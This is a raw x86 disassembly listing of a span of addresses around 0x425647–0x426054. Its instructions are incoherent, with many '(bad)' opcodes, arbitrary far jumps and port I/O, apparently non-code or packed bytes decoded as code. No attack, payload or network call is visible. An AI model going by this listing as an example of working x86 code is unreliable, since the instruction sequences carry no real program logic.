  425647:	call   0xec2abdce
  42564c:	loop   0x42569c
  42564e:	sbb    bh,0xe6
  425651:	add    BYTE PTR [edi-0x76fb0818],0x54
  425658:	in     al,dx
  425659:	inc    ecx
  42565a:	inc    edx
  42565b:	shl    edi,cl
  42565d:	cmp    esp,0x3d
  425660:	ror    DWORD PTR [ebp+0x3b446c04],cl
  425666:	dec    esi
  425667:	push   ds
  425668:	xchg   edi,eax
  425669:	(bad)  
  42566a:	das    
  42566b:	fs mov bh,0xd2
  42566e:	sbb    cl,BYTE PTR [edi]
	...
  425688:	add    BYTE PTR [ebx-0x26],bh
  42568b:	fistp  DWORD PTR [esi+0x6dbf70e6]
  425691:	aaa    
  425692:	ror    DWORD PTR [esi],cl
  425694:	(bad)  
  425695:	(bad)  
  425696:	jmp    0x344c:0xe20200fc
  42569d:	bound  ebx,QWORD PTR [edx]
  42569f:	pop    ss
  4256a0:	ror    BYTE PTR [ebx-0x3e],0x84
  4256a4:	inc    ebp
  4256a5:	inc    edi
  4256a6:	xchg   DWORD PTR [ecx-0x10],eax
  4256a9:	retf   0x147b
  4256ac:	mov    eax,0x2bbd
  4256b1:	ret    
  4256b2:	not    edi
  4256b4:	jb     0x42570b
  4256b6:	jp     0x4256e4
  4256b8:	jne    0x425647
  4256ba:	add    ah,BYTE PTR [esi+0x3b]
  4256bd:	aad    0x3a
  4256bf:	cmp    ch,BYTE PTR [edx+0x4b]
  4256c2:	jne    0x425645
  4256c4:	push   cs
  4256c5:	(bad)  
  4256c7:	sti    
  4256c8:	push   0xffffff8d
  4256ca:	xchg   edx,eax
  4256cb:	in     al,0xf3
  4256cd:	add    eax,DWORD PTR [ecx]
  4256cf:	add    BYTE PTR [edx-0x3b80f95d],cl
  4256d5:	dec    ecx
  4256d6:	jmp    0xc166:0x24d5133
  4256dd:	push   cs
  4256de:	or     ah,BYTE PTR [esi-0x77]
  4256e1:	loopne 0x4256e8
  4256e3:	sti    
  4256e4:	call   FWORD PTR [edx+0x6d]
  4256e7:	test   DWORD PTR [ebp-0x41ab5],ebx
	...
  425705:	add    al,cl
  425707:	aad    0x8
  425709:	dec    DWORD PTR [edx-0x1c]
  42570c:	xchg   esi,eax
  42570e:	xor    eax,0xd004ed6
  425713:	jle    0x4256d1
  425715:	jne    0x425713
  425717:	call   0x8400:0xee17e4
  42571e:	pop    ebp
  42571f:	or     DWORD PTR cs:[ebx-0x750297ed],ecx
  425726:	dec    ebx
  425727:	in     al,0xc
  425729:	jmp    0x45e322
  42572e:	hlt    
  42572f:	mov    eax,0x7ee30b84
  425734:	pop    esi
  425735:	dec    edi
  425736:	daa    
  425737:	mov    ds:0x6c253e6b,eax
  42573c:	add    BYTE PTR [esp+esi*4-0x74f301b1],al
  425743:	call   0xb6fe5457
  425748:	retf   
  425749:	inc    edi
  42574a:	sub    BYTE PTR [ecx-0x7d],ch
  42574d:	out    0x1,eax
  42574f:	xor    DWORD PTR [edi],eax
  425751:	or     eax,0xfd11e06b
  425756:	fwait
  425757:	push   ss
  425758:	jmp    0xafb5:0xf63b7be
  42575f:	loop   0x425725
  425761:	out    dx,eax
  425762:	sbb    dl,ch
  425764:	sti    
  425765:	lds    esi,FWORD PTR [ecx]
  425767:	and    eax,DWORD PTR [ecx]
  425769:	mov    DWORD PTR [eax],eax
	...
  425783:	mov    ecx,0x544a8b03
  425788:	in     al,0x13
  42578a:	mov    DWORD PTR [ecx-0xb7719a5],edi
  425790:	jge    0x42571b
  425792:	(bad)  
  425793:	js     0x4257e3
  425795:	je     0x42c314
  42579b:	outs   dx,DWORD PTR ds:[esi]
  42579c:	lea    cx,[edx+0x1c]
  4257a0:	sbb    al,0xb7
  4257a2:	cld    
  4257a3:	les    eax,FWORD PTR [ebx]
  4257a5:	test   DWORD PTR [edi-0x7f19b05f],edi
  4257ab:	mov    eax,ds:0x800c5fa3
  4257b0:	stos   DWORD PTR es:[edi],eax
  4257b1:	sbb    al,0xff
  4257b3:	mov    BYTE PTR [ebx-0x75],ah
  4257b6:	add    al,0x9e
  4257b8:	imul   esi,DWORD PTR [edi-0x2cfb5b04],0xffffff8c
  4257bf:	mov    dh,0x50
  4257c1:	in     eax,dx
  4257c2:	cdq    
  4257c3:	repz int3 
  4257c5:	sbb    dl,BYTE PTR [edx]
  4257c7:	cmp    al,0xda
  4257c9:	aaa    
  4257ca:	out    dx,al
  4257cb:	icebp  
  4257cc:	dec    ebx
  4257cd:	sub    ebp,DWORD PTR [eax-0x16]
  4257d0:	add    al,0xe7
  4257d2:	add    ebx,ebp
  4257d4:	inc    BYTE PTR [eax]
  4257d6:	cmpxchg edx,ecx
  4257d9:	or     BYTE PTR [ecx],0xf4
  4257dc:	add    al,0xe7
  4257de:	mov    ebx,0x6b92da6e
  4257e3:	adc    al,0x22
  4257e5:	out    0x3,eax
	...
  4257ff:	add    BYTE PTR [ebp-0x36],bh
  425802:	push   esi
  425803:	adc    BYTE PTR [ecx+0x5],ch
  425806:	xchg   edi,eax
  425807:	mov    WORD PTR [ecx+0x2d0fd0b5],?
  42580d:	xor    BYTE PTR [ebx+0x55149373],0x3
  425814:	hlt    
  425815:	lods   eax,DWORD PTR ds:[esi]
  425816:	mov    edi,0xf4d33b86
  42581b:	pusha  
  42581c:	out    0x68,al
  42581e:	popa   
  42581f:	(bad)  
  425820:	pop    ebx
  425821:	add    al,0x56
  425823:	add    eax,esp
  425825:	jg     0x425854
  425827:	mov    bl,0x6e
  425829:	retf   0xb32a
  42582c:	pop    ebx
  42582d:	pop    ds
  42582e:	cmp    eax,0x6b804860
  425833:	aaa    
  425834:	ret    
  425835:	shl    eax,1
  425837:	add    al,0xc0
  425839:	cld    
  42583a:	jno    0x425843
  42583c:	sahf   
  42583d:	add    al,0x3e
  42583f:	pop    edi
  425840:	mov    ebx,0xfbc16218
  425845:	push   edx
  425846:	sub    esi,DWORD PTR [eax+0x74]
  425849:	retf   0x8ce
  42584c:	jne    0x425818
  42584e:	dec    eax
  425850:	test   BYTE PTR [ebp-0x7b0f4abe],0x7a
  425857:	xchg   ebp,eax
  425858:	in     al,dx
  425859:	add    DWORD PTR [edx-0x3aeaaa8],eax
  42585f:	bound  edi,QWORD PTR [ebp+0xa98237]
	...
  42587d:	mov    esp,0xa7f188fd
  425882:	push   eax
  425883:	dec    esi
  425884:	icebp  
  425885:	jbe    0x42586d
  425887:	shr    ecx,cl
  425889:	jle    0x42580f
  42588b:	(bad)
  42588f:	xchg   DWORD PTR [edx+0x10],ebp
  425892:	push   esp
  425893:	cld    
  425894:	jmp    0x6b079d17
  425899:	or     BYTE PTR [esp+edi*8-0x17],dl
  42589d:	clc    
  42589e:	pop    esp
  42589f:	jp     0x42588a
  4258a1:	test   DWORD PTR [esp+eax*4],0xcedac29
  4258a8:	jg     0x425921
  4258aa:	sbb    edi,edi
  4258ac:	call   0xc5cad6a8
  4258b1:	lock add al,0x0
  4258b4:	jo     0x42583a
  4258b6:	test   BYTE PTR [edi],bl
  4258b8:	call   0x6b405db4
  4258bd:	add    BYTE PTR [esp+edi*8-0x17],dl
  4258c1:	outs   dx,BYTE PTR ds:[esi]
  4258c2:	mov    esi,0xaefb93c3
  4258c7:	mov    al,ch
  4258c9:	jl     0x42585e
  4258cb:	jae    0x4258a3
  4258cd:	repnz call 0x7200:0x4f121b0
  4258d5:	aaa    
  4258d6:	or     eax,DWORD PTR [edi-0x10c7993]
  4258dc:	call   0xc2abd8
	...
  4258f9:	add    ch,dh
  4258fb:	or     DWORD PTR [eax],eax
  4258fd:	add    BYTE PTR [esi-0x37b5ff38],bl
  425903:	lds    edi,FWORD PTR [ebp+edi*2+0x46]
  425907:	or     BYTE PTR [ecx+0x21],dh
  42590a:	out    0xf4,eax
  42590c:	mov    BYTE PTR [ebp+0x45],al
  42590f:	xchg   esi,eax
  425910:	mov    DWORD PTR [ebp+0x49],eax
  425913:	xchg   esi,eax
  425914:	sti    
  425915:	adc    eax,0x3c5b01
  42591a:	dec    esi
  42591b:	retf   0x8d08
  42591e:	sbb    BYTE PTR [ebp+0x4c],ch
  425921:	push   0xfffffff8
  425923:	pop    esi
  425924:	or     BYTE PTR [eax+0x75],bl
  425927:	adc    bl,dl
  425929:	(bad)  
  42592a:	push   edx
  42592b:	jne    0x42599e
  42592d:	int3   
  42592e:	inc    ebp
  42592f:	clc    
  425930:	mov    bl,0xff
  425932:	inc    edx
  425933:	xchg   ebx,eax
  425934:	pop    edx
  425935:	pop    ebx
  425936:	aam    0xc3
  425938:	add    BYTE PTR [eax],al
  42593a:	jnp    0x4258d7
  42593c:	xchg   eax,esi
  42593e:	mov    ?,WORD PTR [ebx+0x961be35]
  425944:	add    BYTE PTR [eax],al
  425946:	dec    eax
  425947:	dec    esi
  425948:	push   ebx
  425949:	push   edi
  42594a:	cmp    bl,BYTE PTR [ebx+0x594915fb]
  425950:	cmp    al,0x0
  425952:	aam    0x87
  425954:	pop    eax
  425955:	add    DWORD PTR [ebp+0x6],ecx
  425958:	aaa    
  425959:	(bad)  
  42595a:	fmul   DWORD PTR [ecx]
  42595c:	xor    al,al
	...
  425976:	add    dh,ah
  425978:	add    esi,DWORD PTR [eax-0x406f9dff]
  42597e:	push   ebp
  42597f:	(bad)  
  425980:	loope  0x425a01
  425982:	in     al,dx
  425983:	loope  0x425918
  425985:	xchg   eax,ebx
  425987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425988:	add    DWORD PTR [ecx+eax*1],0xfffffff4
  42598c:	pop    ebx
  42598d:	add    BYTE PTR [edi-0x7f796047],al
  425993:	call   0xaa4259f4
  425998:	aam    0xc4
  42599a:	jecxz  0x425a15
  42599c:	fistp  WORD PTR [edi]
  42599e:	inc    DWORD PTR [ebx]
  4259a0:	pop    esp
  4259a1:	mov    bl,0x30
  4259a3:	add    cl,BYTE PTR [ecx+ecx*4]
  4259a6:	jb     0x425974
  4259a8:	stos   BYTE PTR es:[edi],al
  4259a9:	(bad)  
  4259aa:	fcomip st,st(5)
  4259ac:	pop    ebx
  4259ad:	add    BYTE PTR [eax],al
  4259af:	ins    DWORD PTR es:[edi],dx
  4259b0:	sub    BYTE PTR [esp+edi*8+0x1],ch
  4259b4:	fs out dx,al
  4259b6:	aas    
  4259b7:	hlt    
  4259b8:	aam    0xd4
  4259ba:	test   DWORD PTR ds:0xc3febc0f,0x3a860b5b
  4259c4:	pop    ebp
  4259c5:	add    BYTE PTR [eax],al
  4259c7:	jg     0x4259a7
  4259c9:	mov    bh,0xfe
  4259cb:	stos   DWORD PTR es:[edi],eax
  4259cc:	pop    ebx
  4259cd:	xchg   DWORD PTR [edx-0x64],ecx
  4259d0:	out    0x17,al
  4259d2:	mov    BYTE PTR [edx+0x78ff5aa0],dh
  4259d8:	sbb    DWORD PTR [ebx],ecx
  4259da:	test   BYTE PTR [eax],al
	...
  4259f4:	and    BYTE PTR [ebp+0x0],bl
  4259f7:	add    BYTE PTR [edi-0x57],ch
  4259fa:	or     BYTE PTR [ebx+0x69f16fb4],al
  425a00:	hlt    
  425a01:	mov    ebx,DWORD PTR [ebx+0x12]
  425a04:	or     BYTE PTR [edi-0x40],cl
  425a07:	(bad)  
  425a08:	js     0x425a25
  425a0a:	or     eax,DWORD PTR [eax+ebx*1+0x3a00005d]
  425a11:	test   al,0x5d
  425a13:	push   DWORD PTR [ecx]
  425a15:	mov    al,ds:0x19f2ff5b
  425a1a:	(bad)  
  425a1d:	add    al,0xc7
  425a1f:	add    BYTE PTR [ebp-0x40],bh
  425a22:	jecxz  0x425a63
  425a24:	jb     0x4259ed
  425a26:	ret    0x3a86
  425a29:	add    DWORD PTR [ebx+0x47],esp
  425a2c:	sbb    edx,DWORD PTR [ecx-0x1a]
  425a2f:	or     al,0x4a
  425a31:	ret    
  425a32:	jmp    0xe8d7:0x1f0087cb
  425a39:	jg     0x425a5f
  425a3b:	mov    eax,0xf4de8591
  425a40:	fmul   QWORD PTR [eax]
  425a42:	ins    BYTE PTR es:[edi],dx
  425a43:	lds    esi,FWORD PTR [edi]
  425a45:	out    0x69,eax
  425a47:	sbb    esi,esi
  425a49:	(bad)  
  425a4b:	mov    dh,BYTE PTR [esi]
  425a4d:	pop    ecx
  425a4e:	xchg   ecx,eax
  425a4f:	pop    es
  425a50:	jne    0x425a3c
  425a52:	jb     0x425a57
  425a54:	jne    0x425a28
  425a56:	jp     0x425a5b
	...
  425a70:	add    cl,dh
  425a72:	mov    BYTE PTR [ebx+0x3],dl
  425a75:	hlt    
  425a76:	add    al,0xf6
  425a78:	xchg   esp,eax
  425a79:	cmp    ecx,edi
  425a7b:	jno    0x425a32
  425a7d:	sti    
  425a7e:	jnp    0x425a8f
  425a80:	mov    ah,0x45
  425a82:	push   eax
  425a83:	rcl    DWORD PTR [edi-0x68],cl
  425a86:	mov    eax,0xd95387d6
  425a8b:	lock adc BYTE PTR [esi],0x55
  425a8f:	out    0x45,al
  425a91:	ss dec edi
  425a93:	out    0x68,eax
  425a95:	add    dl,BYTE PTR [eax-0x5]
  425a98:	dec    edi
  425a99:	push   es
  425a9a:	(bad)
  425a9d:	sub    ch,BYTE PTR [eax]
  425a9f:	out    0x3,eax
  425aa1:	sbb    eax,0xe01f8d46
  425aa6:	mov    dh,0x71
  425aa8:	dec    ebx
  425aa9:	rcr    BYTE PTR [ebp-0x25],cl
  425aac:	and    al,0xf4
  425aae:	add    al,0x0
  425ab0:	jge    0x425ae5
  425ab2:	test   esi,esp
  425ab4:	xlat   BYTE PTR ds:[ebx]
  425ab5:	call   0xf82c1842
  425aba:	add    al,0x81
  425abc:	sar    ah,1
  425abe:	fdivr  DWORD PTR ds:0xc5c3562
  425ac4:	xchg   edi,eax
  425ac5:	xor    al,0x3
  425ac7:	fcomp  DWORD PTR [ecx]
  425ac9:	mov    al,ds:0xafbef90e
  425ace:	mov    ah,0xe7
  425ad0:	dec    esi
  425ad1:	mov    ds:0xaefc50,eax
	...
  425aee:	arpl   WORD PTR [esi+edi*8+0x1251f7e8],bp
  425af5:	pop    ecx
  425af6:	loop   0x425b07
  425af8:	add    BYTE PTR [edx-0x39bef3f2],al
  425afe:	test   DWORD PTR [esp+edi*2],0x24c8ed9e
  425b05:	jmp    0xb4502a01
  425b0a:	mov    ch,0x28
  425b0c:	add    cl,ch
  425b0e:	stos   DWORD PTR es:[edi],eax
  425b0f:	or     BYTE PTR [ebx],bh
  425b11:	mov    eax,0xd40004d6
  425b16:	xor    eax,edx
  425b18:	jp     0x425b71
  425b1a:	clc    
  425b1b:	ror    DWORD PTR [ebx],cl
  425b1d:	daa    
  425b1e:	mov    ch,0x51
  425b20:	(bad)  
  425b21:	outs   dx,DWORD PTR ds:[esi]
  425b22:	mov    ch,0x5f
  425b24:	call   0xfb058913
  425b29:	aaa    
  425b2a:	mov    ch,0x50
  425b2c:	jg     0x425ada
  425b2e:	push   ds
  425b2f:	push   es
  425b30:	or     eax,0xfc50666b
  425b35:	push   ds
  425b36:	jo     0x425b02
  425b38:	cli    
  425b39:	jmp    0x425b7f
  425b3b:	dec    DWORD PTR [eax-0x407c1059]
  425b41:	add    cl,dl
  425b43:	in     al,dx
  425b44:	ret    0x5946
  425b47:	jmp    0x8029:0xde4d0022
  425b4e:	enter  0xfcad,0x73
	...
  425b6a:	add    BYTE PTR [ebx],cl
  425b6c:	mov    BYTE PTR [edx+0x70],bh
  425b6f:	sbb    eax,0x34e81034
  425b74:	je     0x425b71
  425b76:	call   DWORD PTR [esi+0x1d015086]
  425b7c:	add    eax,DWORD PTR [edi+0x2086354d]
  425b82:	mov    BYTE PTR ds:0xd38b10de,cl
  425b88:	add    BYTE PTR [ecx-0x7903ee40],al
  425b8e:	dec    ebp
  425b8f:	lea    eax,[ecx-0x55e2f3b6]
  425b95:	adc    DWORD PTR [eax-0x103bd21],esi
  425b9b:	and    BYTE PTR [ecx-0x108aba79],dh
  425ba1:	jle    0x425bfb
  425ba3:	int3   
  425ba4:	add    al,BYTE PTR [eax]
  425ba6:	cmovg  ecx,DWORD PTR [eax+0x7f1afffa]
  425bad:	imul   eax
  425baf:	outs   dx,BYTE PTR ds:[esi]
  425bb0:	or     DWORD PTR [eax],eax
  425bb2:	add    BYTE PTR [edx+0x35],cl
  425bb5:	in     al,0xff
  425bb7:	mov    al,ds:0x9d400e56
  425bbc:	mov    ebx,DWORD PTR [edx+0x5b]
  425bbf:	(bad)  
  425bc0:	(bad)  
  425bc1:	push   ecx
  425bc2:	mov    edi,DWORD PTR [ecx]
  425bc4:	xchg   eax,ebp
  425bc6:	sbb    BYTE PTR [ebx-0x6d],ah
  425bc9:	xchg   eax,edi
  425bcb:	out    0x46,al
  425bcd:	or     al,0x85
	...
  425be7:	add    BYTE PTR ds:0xf4f083fb,bl
  425bed:	pop    ebx
  425bee:	add    BYTE PTR [eax],al
  425bf0:	bound  ebx,QWORD PTR [ebx-0x1ffd0105]
  425bf6:	pop    esi
  425bf7:	dec    DWORD PTR [ebx+0x5c]
  425bfa:	mov    al,BYTE PTR [eax-0x23]
  425bfd:	fcmovu st,st(7)
  425bff:	div    esp
  425c01:	pop    ebp
  425c02:	dec    ecx
  425c03:	xchg   DWORD PTR [ecx-0x177b7b9a],edi
  425c09:	pop    esp
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	(bad)  
  425c0d:	in     al,0xbc
  425c0f:	jmp    0x425c2c
  425c11:	pop    ecx
  425c12:	clc    
  425c13:	adc    DWORD PTR [ebx+ebx*2+0x5cacbc83],esi
  425c1a:	add    BYTE PTR [eax],al
  425c1c:	hlt    
  425c1d:	data16 jle 0x425bc1
  425c20:	hlt    
  425c21:	pop    ebx
  425c22:	add    BYTE PTR [ecx+0x10f7b],cl
  425c28:	hlt    
  425c29:	rol    ah,cl
  425c2b:	imul   DWORD PTR [edi+0x2f]
  425c2e:	mov    BYTE PTR [esi-0xa83879f],al
  425c34:	dec    eax
  425c35:	sbb    BYTE PTR [ebx+0x43e8fc45],cl
  425c3b:	jae    0x425c76
  425c3d:	add    al,BYTE PTR [eax+edx*2]
  425c40:	mov    ebx,0x3410f438
  425c45:	pop    esp
  425c46:	jge    0x425c07
  425c48:	and    DWORD PTR [ebx+ecx*4],esp
  425c4b:	inc    ebp
	...
  425c64:	add    BYTE PTR [eiz*8+0x1b71efbc],ah
  425c6b:	shr    BYTE PTR ds:0x88f08d7f,1
  425c71:	xor    DWORD PTR [eax],ebx
  425c73:	cmp    DWORD PTR [edi+0x183a0eea],0xffffff82
  425c7a:	cli    
  425c7b:	push   ebx
  425c7c:	imul   ecx,DWORD PTR [eax],0xf7c27405
  425c82:	mov    ah,0x6b
  425c84:	(bad)  
  425c87:	adc    eax,0xa6f6c3ef
  425c8c:	add    esi,DWORD PTR [ebp+0x48]
  425c8f:	bnd jle 0x425c1d
  425c92:	xlat   BYTE PTR ds:[ebx]
  425c93:	out    dx,al
  425c94:	lea    esi,[esi-0xb3e51b3]
  425c9a:	fcom   st(6)
  425c9c:	pop    eax
  425c9d:	mov    dh,0x4c
  425c9f:	jno    0x425c5f
  425ca1:	and    ecx,DWORD PTR [ecx]
  425ca3:	mov    bx,0x4d22
  425ca7:	out    0xd5,al
  425ca9:	test   BYTE PTR [ecx+0x19],bl
  425cac:	lea    eax,[esi+0x7c417154]
  425cb2:	cmp    esi,ecx
  425cb4:	push   cs
  425cb5:	add    BYTE PTR [edi+eiz*8],al
  425cb8:	mov    WORD PTR [ecx+0x674363fc],?
  425cbe:	add    BYTE PTR [edx-0x1f],ch
  425cc1:	inc    DWORD PTR [edi+esi*1]
  425cc4:	pop    ecx
  425cc5:	push   es
  425cc6:	xchg   ebp,eax
  425cc7:	clc    
  425cc8:	ret    
	...
  425ce1:	add    bl,bl
  425ce3:	jg     0x425cf8
  425ce5:	push   eax
  425ce6:	fild   DWORD PTR [edi+0x3a]
  425ce9:	pop    eax
  425cea:	enter  0x6580,0xaf
  425cee:	ret    0xe64c
  425cf1:	mov    WORD PTR [esi],gs
  425cf3:	dec    ebp
  425cf4:	imul   ebx,DWORD PTR [edi],0xbe72057c
  425cfa:	mov    ds:0xa2bb6610,eax
  425cff:	dec    esp
  425d00:	out    0xcf,al
  425d02:	neg    BYTE PTR [ecx+eiz*4+0x3]
  425d06:	hlt    
  425d07:	add    al,0x46
  425d09:	into   
  425d0a:	lahf   
  425d0b:	dec    esp
  425d0c:	shl    edi,cl
  425d0e:	in     eax,0xc4
  425d10:	(bad)  
  425d11:	call   0x12376d1e
  425d16:	jp     0x425cd5
  425d18:	adc    eax,0xbf24b002
  425d1d:	jae    0x425d4e
  425d1f:	add    eax,0xd8010080
  425d24:	adc    BYTE PTR [edx+0x64],ah
  425d27:	cmp    dh,0xe8
  425d2a:	test   DWORD PTR [ebp+0x6487e5bf],0x489c2522
  425d34:	sub    DWORD PTR [ecx],0x43
  425d37:	hlt    
  425d38:	push   eax
  425d39:	out    0x7b,al
  425d3b:	int3   
  425d3c:	(bad)  
  425d3d:	call   0x9aefba39
  425d42:	ret    0x8348
  425d45:	test   eax,0x0
	...
  425d5e:	add    BYTE PTR [esp+eax*1],ah
  425d61:	push   ebp
  425d62:	jb     0x425d1b
  425d64:	arpl   WORD PTR [edi],dx
  425d66:	in     eax,0xf7
  425d68:	add    al,0x5d
  425d6a:	pop    ss
  425d6b:	test   eax,0x7a03044
  425d70:	aaa    
  425d71:	ss jbe 0x425d1c
  425d74:	dec    edx
  425d75:	cld    
  425d76:	jmp    0x6498752c
  425d7b:	imul   esi,DWORD PTR [edi-0x4a081702],0xffffff88
  425d82:	out    dx,eax
  425d83:	jbe    0x425d94
  425d85:	nop
  425d86:	jmp    0xd5cb5e3e
  425d8b:	inc    edi
  425d8c:	sbb    DWORD PTR [ebx],0x61
  425d8f:	mov    ecx,0x687e38c5
  425d94:	dec    edx
  425d95:	cld    
  425d96:	jmp    0x129ac160
  425d9b:	loope  0x425d74
  425d9d:	or     eax,0xfeb37b60
  425da2:	call   FWORD PTR [ebp+0x49c96707]
  425da8:	fistp  QWORD PTR [edi+0x5e078da1]
  425dae:	ret    
  425daf:	mov    ds,WORD PTR [edx+0x59ad3d87]
  425db5:	cmp    al,0x0
  425db7:	ds push cs
  425db9:	addr16 adc al,dl
  425dbc:	retf   0x104
  425dbf:	pop    ebp
  425dc0:	pop    es
  425dc1:	ret    
  425dc2:	push   es
	...
  425ddb:	add    BYTE PTR ds:0x5e003c28,bh
  425de1:	xchg   edi,eax
  425de2:	test   DWORD PTR [esi+0x6d],ebx
  425de8:	xchg   esp,eax
  425de9:	shl    BYTE PTR [eax+0x1],cl
  425dec:	sbb    eax,0xc7d7fb07
  425df1:	clc    
  425df2:	mov    BYTE PTR [esi+0x25],al
  425df8:	into   
  425df9:	nop
  425dfa:	sti    
  425dfb:	xlat   BYTE PTR ds:[ebx]
  425dfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dfd:	dec    eax
  425dfe:	mov    DWORD PTR [esi+0x1ed],eax
  425e04:	ficom  WORD PTR [eax+0xa5ed7fb]
  425e0a:	and    DWORD PTR [edx-0x17],ebp
  425e0d:	jle    0x425da9
  425e0f:	cmp    ah,cl
  425e11:	push   es
  425e12:	add    al,ch
  425e14:	sar    BYTE PTR [edi+0x7c0dfffc],1
  425e1a:	inc    edx
  425e1b:	add    al,0x65
  425e1d:	dec    edi
  425e1e:	sub    eax,0x397f42ff
  425e23:	and    BYTE PTR [edi+0x1b8cfc46],bl
  425e29:	repnz cld 
  425e2b:	call   FWORD PTR [ebp+0x10d7fb96]
  425e31:	enter  0x164,0xf4
  425e35:	pop    ebx
  425e36:	add    BYTE PTR [eax+0x7d],dl
  425e39:	fisubr DWORD PTR [esi+edi*8-0x6274a375]
	...
  425e58:	add    BYTE PTR [ebx*2-0x4d930000],bl
  425e5f:	mov    ah,0xfe
  425e61:	jae    0x425ebf
  425e63:	push   ebp
  425e64:	aam    0x7f
  425e66:	cwde   
  425e67:	sbb    al,0xc
  425e69:	ins    DWORD PTR es:[edi],dx
  425e6a:	loop   0x425edc
  425e6c:	(bad)  
  425e6d:	pop    ebx
  425e6e:	pop    esp
  425e6f:	xchg   DWORD PTR [ebp+0x5d68],eax
  425e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e76:	aam    0x72
  425e78:	jg     0x425e6f
  425e7a:	pop    ebx
  425e7b:	add    BYTE PTR [edi+0x3d85a],al
  425e81:	hlt    
  425e82:	pop    edx
  425e83:	sub    bl,BYTE PTR [edi+edi*2-0x66]
  425e87:	mov    dh,0xc1
  425e89:	clc    
  425e8a:	pop    ebx
  425e8b:	stos   DWORD PTR es:[edi],eax
  425e8c:	mov    BYTE PTR ds:0x13ffee44,bl
  425e92:	pop    esp
  425e93:	dec    edx
  425e94:	inc    ebx
  425e95:	rcl    BYTE PTR [ebx+0x1],1
  425e98:	je     0x425e94
  425e9a:	repnz imul eax,edx,0x55
  425e9e:	pop    esp
  425e9f:	add    BYTE PTR [ecx+0x341fabb],cl
  425ea5:	hlt    
  425ea6:	push   cs
  425ea7:	scas   al,BYTE PTR es:[edi]
  425ea8:	imul   edi,eax,0x5d1ffaa2
  425eae:	sbb    al,0x4
  425eb0:	mov    ecx,DWORD PTR [ebx-0xbfffe9d]
  425eb6:	xchg   DWORD PTR es:0x5cf9479,ecx
	...
  425ed5:	add    BYTE PTR [edi+0x5c],ch
  425ed8:	out    0xfe,al
  425eda:	mov    dl,0x2b
  425edc:	jg     0x425ea3
  425ede:	lock add al,0xb2
  425ee1:	into   
  425ee2:	xchg   ecx,eax
  425ee3:	or     edi,DWORD PTR [esi-0x44]
  425ee6:	call   0x657d:0xf1cde649
  425eed:	mov    al,0x8a
  425eef:	dec    ecx
  425ef0:	out    0x86,al
  425ef2:	imul   DWORD PTR [ecx+ebp*2+0x1c]
  425ef6:	hlt    
  425ef7:	shr    ch,1
  425ef9:	mov    BYTE PTR [ebx],ah
  425efb:	pop    ebp
  425efc:	rcl    DWORD PTR [eax+0x18a94968],cl
  425f02:	sub    DWORD PTR [edi+eiz*8+0x8d6f403],0xf8f10689
  425f0d:	ret    
  425f0e:	dec    ebx
  425f0f:	js     0x425f7e
  425f11:	sbb    BYTE PTR [ebx+0x49],al
  425f14:	out    0xb3,al
  425f16:	cmp    BYTE PTR [edx],dh
  425f18:	cmc    
  425f19:	mov    edi,es
  425f1b:	add    esp,edi
  425f1d:	add    ebx,DWORD PTR [eax+ebp*4]
  425f20:	xchg   DWORD PTR [ebx],eax
  425f22:	hlt    
  425f23:	jge    0x425f8a
  425f25:	mov    bh,0x1a
  425f27:	dec    ecx
  425f28:	out    0x7e,al
  425f2a:	push   ebx
  425f2b:	shl    ch,1
  425f2d:	mov    bl,0x8
  425f2f:	out    dx,eax
  425f30:	jmp    0x937c:0x6c04c3f0
  425f37:	add    esp,edi
  425f39:	add    eax,DWORD PTR [eax]
	...
  425f53:	inc    esp
  425f54:	dec    eax
  425f55:	xchg   esp,eax
  425f56:	xchg   BYTE PTR [eax+0x71],dh
  425f59:	out    0x3,eax
  425f5b:	hlt    
  425f5c:	mov    ah,0x9d
  425f5e:	sub    eax,0x30690d8
  425f63:	hlt    
  425f64:	add    al,0x7f
  425f66:	and    eax,0xb5e7056b
  425f6b:	mov    eax,0xfbcfbb00
  425f70:	add    al,0x0
  425f72:	adc    dh,BYTE PTR ds:0x667d88b3
  425f78:	mov    bh,0x8a
  425f7a:	outs   dx,BYTE PTR ds:[esi]
  425f7b:	or     ecx,DWORD PTR [eax-0x4]
  425f7e:	jmp    0x5684a1ea
  425f83:	idiv   DWORD PTR [edi+0x42]
  425f86:	push   ecx
  425f87:	and    bl,dh
  425f89:	pop    ss
  425f8a:	(bad)  [edi+0x3f7e7f48]
  425f90:	inc    edi
  425f91:	cld    
  425f92:	jmp    0xe941a85f
  425f97:	cmp    BYTE PTR [edi+0x5dcf2e88],dh
  425f9d:	stc    
  425f9e:	push   ds
  425f9f:	rol    BYTE PTR [ebx+0x7d919dbf],0x8c
  425fa6:	mov    cl,0xf6
  425fa8:	add    al,0x0
  425faa:	test   al,0x4c
  425fac:	aas    
  425fad:	jae    0x425f46
  425faf:	jb     0x425f42
  425fb1:	push   ebx
  425fb2:	call   0xcd2a64ae
	...
  425fcf:	add    BYTE PTR [edi+0x48],dl
  425fd2:	cld    
  425fd3:	ins    DWORD PTR es:[edi],dx
  425fd4:	mov    eax,0x336c28d3
  425fd9:	add    al,0x50
  425fdb:	(bad)  
  425fdc:	or     eax,0xf0290ef0
  425fe1:	jge    0x425f67
  425fe3:	and    ecx,edi
  425fe5:	add    al,0x0
  425fe7:	jb     0x425fdf
  425fe9:	jg     0x426006
  425feb:	push   0xe85b9147
  425ff0:	test   DWORD PTR [edi*8-0x3b96f92],0xaff346e9
  425ffb:	sti    
  425ffc:	mov    bh,0x47
  425ffe:	ret    0x2724
  426001:	inc    edi
  426002:	pop    edx
  426003:	add    BYTE PTR [edx+0x2d],bh
  426006:	hlt    
  426007:	jmp    DWORD PTR [eax-0x62bff1a9]
  42600d:	leave  
  42600e:	inc    ecx
  42600f:	call   DWORD PTR [edi+edi*4+0x51]
  426013:	mov    ecx,DWORD PTR [ecx-0x80]
  426016:	call   0x4808627
  42601b:	push   esi
  42601c:	push   edx
  42601d:	(bad)  
  42601e:	je     0x426030
  426020:	push   ds
  426021:	rcl    DWORD PTR [edx],0xf7
  426024:	ficom  DWORD PTR [edi-0x5]
  426027:	and    esi,DWORD PTR ds:0x5c3c7f86
  42602d:	add    eax,DWORD PTR [eax]
  42602f:	push   eax
  426030:	adc    edi,DWORD PTR [esi]
  426032:	sti    
	...
  42604b:	add    BYTE PTR [eax],al
  42604d:	into   
  42604e:	mov    ebx,0xaf908900
  426053:	sti    
  426054:	adc    eax,0x3c5145
